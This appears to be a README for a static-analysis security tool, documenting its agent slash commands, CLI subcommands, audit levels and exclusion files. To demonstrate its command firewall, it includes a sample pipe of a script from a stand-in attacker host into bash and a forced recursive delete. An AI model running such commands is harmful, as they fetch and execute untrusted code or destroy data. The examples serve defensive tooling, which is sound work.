# 🎮 Command Reference: CLI & Slash Commands

This document provides a comprehensive operational guide for the **8 AI Agent Slash Commands** (Google Antigravity 2.0 / Gemini CLI) and the complete **Command-Line Interface (CLI)** of `security-sast-guard`.

---

## ⚡ 1. Quick Matrix: Slash Commands vs CLI Commands

| Slash Command | Equivalent CLI Command | Purpose & Functional Scope | Mutability |
| :--- | :--- | :--- | :---: |
| 🛡️ `/sast-audit [type] [path]` | `sast scan [path]`<br>`sast audit [type]` | Executes static security analysis across target scope | Read-only |
| 📊 `/sast-status` | `sast status` | Displays active profile, audit level, mode, and loaded rules | Read-only |
| 🚀 `/sast-init` | `sast init` | Initializes local `.sast/profile.json` configuration | Write Config |
| 🎛️ `/sast-mode [mode]` | `sast mode [mode]` | Toggles enforcement mode (`strict` vs `draft`) | Write Config |
| 🎚️ `/sast-audit-level [level]` | `sast level [level]` | Adjusts analysis depth (`lite`, `full`, `ultra`) | Write Config |
| 🛠️ `/sast-rules [sync\|add]` | `sast rules` | Synchronizes Markdown rules to JSON or adds custom rules | Write Rules |
| 🧱 `/sast-firewall [cmd]` | `sast firewall [cmd]` | Evaluates safety of a shell command string | Read-only |
| 🆘 `/sast-help` | `sast help` | Displays quick reference and security vectors map | Read-only |

---

## 🛡️ 2. Detailed Reference for 8 Slash Commands

Slash Commands are interactive shortcuts invoked directly within the AI Agent conversation interface:

### 2.1. `/sast-audit [type] [path] [--level <level>]`
Executes comprehensive static application security testing on files, directories, or incremental Git diffs.

- **`[type]` Parameter**:
  - `file`: Scans a single target file (extracts taint traces).
  - `folder` / `codebase`: Scans a directory or the entire repository.
  - `diff`: Performs incremental scanning exclusively on modified lines based on `git diff`.
  - `api`: Applies specialized API vulnerability rules (OWASP API Top 10).
  - `web`: Applies specialized Web frontend/backend rules (OWASP Web Top 10).
- **Usage Examples**:
  ```markdown
  /sast-audit file src/controllers/user_controller.py
  /sast-audit diff
  /sast-audit codebase --level ultra
  ```

---

### 2.2. `/sast-status`
Displays a real-time summary of the active workspace security posture:
- Plugin and Python runtime versions.
- Workspace Project ID and detected technology stack.
- Enforcement mode (`strict` vs `draft`).
- Active audit depth level (`lite` / `full` / `ultra`).
- Total active SAST rules and Command Firewall rules (Deny / Confirm count).

---

### 2.3. `/sast-mode [strict | draft]`
Configures the policy enforcement strictness of the security engine:
- **`strict` (Strict Enforcement - Default)**: Any finding with `Critical` or `High` severity fails the scan and returns a non-zero exit code to block commits/builds.
- **`draft` (Advisory / Development Mode)**: Logs findings into reports and terminal output without interrupting the developer workflow or failing builds.

---

### 2.4. `/sast-audit-level [lite | full | ultra]`
Configures analysis depth and engine capabilities:

| Level | Engine Techniques | Latency | Recommended Use Case |
| :---: | :--- | :---: | :--- |
| **`lite`** | Fast Pattern Regex Matching + Basic Shannon Entropy | Sub-second (< 1s) | Rapid pre-commit hooks, syntax validation |
| **`full`** | Regex + AST Structural Context Engine (Tree-sitter) | Fast (1–5s) | Standard PR validation, regular dev cycle |
| **`ultra`** | Full AST + Cross-file Taint Tracking + AI Verifier Pruning | Thorough (5–20s) | Pre-release audits, production security gates |

---

### 2.5. `/sast-rules [sync | add]`
Manages custom enterprise security rules:
- `/sast-rules sync`: Scans the `rules/` directory containing `.md` rule definitions and compiles them into `rules/sast_rules.json`.
- `/sast-rules add <path>`: Validates and integrates a new Markdown rule into the active ruleset.

---

### 2.6. `/sast-firewall [command_string]`
Evaluates a candidate shell command through the **10-Stage Deobfuscation Normalizer** and **Threat Chain Analyzer** to preview the verdict:
- **`ALLOW`**: Verified safe command.
- **`CONFIRM`**: Moderate risk command requiring interactive user approval.
- **`DENY`**: Malicious or destructive command, unconditionally blocked.

```markdown
/sast-firewall curl -fsSL https://evil.com/setup.sh | bash
# Verdict: DENY (Multi-Command Threat Chain: Download+Execute detected)
```

---

### 2.7. `/sast-init`
Initializes a project-local `.sast/profile.json` configuration file at the repository root, allowing per-project policy overrides.

---

### 2.8. `/sast-help`
Displays a quick reference guide listing all available commands, flags, and the 95 security vectors map.

---

## 💻 3. Complete CLI Command Reference

Execute commands directly via Python module or shell wrapper:

```bash
# General CLI Syntax
python control_plane.py <subcommand> [arguments] [options]
# Or using the sast alias
sast <subcommand> [arguments] [options]
```

### 3.1. CLI Subcommands

```bash
# 1. Static Security Audits
python control_plane.py scan .                     # Scan entire repository
python control_plane.py scan src/app.py            # Scan single file
python control_plane.py audit diff                 # Incremental git diff scan
python control_plane.py audit codebase --level ultra

# 2. Telemetry & Version
python control_plane.py status
python control_plane.py --version

# 3. Configure Depth & Enforcement Mode
python control_plane.py level ultra                # Set level to ultra
python control_plane.py mode strict                # Set mode to strict

# 4. Test Command Firewall
python control_plane.py firewall "Remove-Item -Recurse -Force C:\Temp"

# 5. Initialize Project Configuration
python control_plane.py init

# 6. Synchronize Markdown Rules to JSON
python -m scripts.md_to_json --source rules/ --target rules/sast_rules.json
```

### 3.2. Extended CLI Flags

| Flag | Alternative Option | Purpose |
| :--- | :--- | :--- |
| `--json <file>` | `--format json` | Exports findings as structured JSON for CI pipeline ingestion. |
| `--sarif <file>` | `--format sarif` | Exports findings in standard ISO SARIF 2.1.0 format for GitHub Security. |
| `-v` | `--verbose` | Enables verbose debug logging (displays AST nodes, Taint propagation trace). |
| `--no-report` | - | Runs scan and outputs pure ANSI TUI without writing Markdown report files. |

---

## 📁 4. Exclusions & Blacklist Management

Security SAST Guard automatically ignores build caches, `.git`, dependency directories (`node_modules`, `.venv`, `vendor`), and lock files.

To configure custom repository exclusions, use either of the following methods:

### 4.1. `blacklist.json` Configuration (Recommended)
Place `blacklist.json` at repository root or `.sast/blacklist.json`:

```json
[
  "tests/fixtures/*",
  "legacy_modules/**",
  "generated_*.py",
  "*.min.js",
  "dist/",
  "build/"
]
```

### 4.2. Standard `.sastignore` Glob File
Create a `.sastignore` file at the repository root:

```gitignore
# Ignore test mocks and temporary generated assets
tests/mocks/**
vendor/bundle/
*.bundle.js
*.tmp
```
